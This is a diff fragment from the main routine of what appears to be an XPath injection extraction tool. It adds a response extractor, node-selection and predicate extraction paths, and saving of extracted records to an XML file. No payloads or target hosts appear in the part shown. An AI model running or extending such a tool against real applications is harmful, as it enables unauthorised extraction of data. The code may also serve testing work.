-                warn(f"Could not detect field name — using '{field_name}'")
+            field_name = get_field_from_param(engine, node_param) if node_param else "text()"
+            info(f"Field: '{field_name}'")
 
-    # ── Run extraction ────────────────────────────────────────────────────────
+    # ── Run ───────────────────────────────────────────────────────────────────
     print()
-    info(f"Starting extraction  method={C.BOLD}{method}{C.RESET}")
+    extractor = ResponseExtractor()
 
     if method == "node_selection":
         data = run_node_selection(
-            engine, inj_param, null_pay, node_param, field_name,
+            engine, inj_param, null_pay, node_param, field_name, extractor,
             args.max_datasets, args.max_depth, args.max_records, args.max_fields,
         )
+        xml_str = build_xml(data, field_name) if data else None
     else:
-        data = run_predicate(engine, inj_param, args.predicate_step, args.max_records)
+        data    = run_predicate(engine, inj_param, extractor, null_pay,
+                                args.predicate_step, args.max_records)
+        xml_str = None
 
-    print_summary(data)
+    # ── Output ────────────────────────────────────────────────────────────────
+    print_summary(data, xml_str if not args.xml else None)
+
+    if args.xml and xml_str:
+        with open(args.xml, "w") as fh:
+            fh.write(xml_str)
+        success(f"XML saved to: {args.xml}")
+    elif args.xml and not xml_str:
+        warn("No data extracted — XML file not saved.")
 
 
 if __name__ == "__main__":
